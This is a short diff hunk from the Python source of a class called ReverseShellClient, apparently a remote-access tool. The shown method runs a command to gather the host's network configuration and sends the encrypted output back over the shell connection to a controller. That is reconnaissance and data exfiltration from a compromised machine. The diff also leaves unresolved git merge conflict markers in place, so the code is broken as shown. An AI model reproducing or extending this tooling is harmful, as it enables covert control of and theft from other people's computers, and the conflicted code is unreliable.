@@ -216,11 +216,16 @@ class ReverseShellClient:
         """
         try:
             if platform.system() == "Windows":
+<<<<<<< Updated upstream
                 command = 'powershell -Command "Get-NetIPAddress -InterfaceIndex 12"'
+=======
+                command = "ipconfig /all"
+>>>>>>> Stashed changes
             else:
                 command = "hostname -I | awk '{print $1}'"
 
             result = self.run_system_command(command)
+<<<<<<< Updated upstream
             logging.info(f"Résultat de ipconfig: {result}")
 
             self.conn.send(
@@ -228,6 +233,14 @@ class ReverseShellClient:
                 + AESCipher.encrypt("EOF").encode("utf-8")
             )
             logging.info("ipconfig géré avec succès")
+=======
+            logging.info(f"ipconfig result: {result}")
+            if platform.system() == "Windows":
+                self.send_large_data(result)
+            else:
+                self.conn.send(AESCipher.encrypt(result).encode("utf-8") + AESCipher.encrypt("EOF").encode("utf-8"))
+                logging.info("ipconfig handled successfully")
+>>>>>>> Stashed changes
 
         except Exception as e:
             logging.error(f"Échec de ipconfig: {e}")
